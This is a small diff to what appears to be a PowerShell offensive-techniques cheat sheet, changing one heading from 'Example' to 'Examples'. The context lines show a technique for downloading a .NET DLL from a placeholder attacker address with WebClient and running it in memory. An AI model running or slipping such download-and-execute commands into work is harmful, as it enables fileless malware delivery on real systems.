@@ -170,7 +170,7 @@ PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
 
 
 ----------------------------------------------------------------------------------
-Example - Download and execute a .NET DLL straight into memory using PowerShell
+Examples - Download and execute a .NET DLL straight into memory using PowerShell
 ----------------------------------------------------------------------------------
 
 PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
